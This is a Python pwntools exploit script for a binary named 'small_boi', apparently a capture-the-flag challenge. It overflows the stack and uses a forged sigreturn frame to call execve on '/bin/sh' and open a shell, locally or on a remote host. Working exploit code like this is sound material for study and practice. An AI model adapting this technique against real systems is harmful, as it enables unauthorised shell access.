#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/small_boi"
TARGET = DIR + EXECUTABLE
HOST, PORT = "127.0.0.1", 4444
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
rop = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][1],
    terminal = ['tmux', 'new-window'],
)
context.binary = elf

io, libc = null, null
None
if args.REMOTE:
    REMOTE = True
    io = remote(HOST, PORT)
else:
    LOCAL = True
    io = process(
        [TARGET, ],
        env={
        #     "LD_PRELOAD":"",
        #     "LD_LIBRARY_PATH":"",
        },
    )

if LOCAL==True:
    #raw_input("Fire GDB!")
    if len(sys.argv) > 1 and sys.argv[1] == "d":
        cmd = """ 
            break *0x40017c
        """
        gdb.attach(io, gdbscript=cmd)

# ==========================[ Exploit
binsh = next(elf.search(b"/bin/sh"))
sigreturn = pack(0x40017c) # call sigreturn syscall

frame = SigreturnFrame()
frame.rip = 0x400185 # syscall
frame.rax = 0x3b # exec
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0

payload = b'a' * 40
payload += sigreturn
payload += bytes(frame)[8:]

io.sendline(payload)
io.interactive()

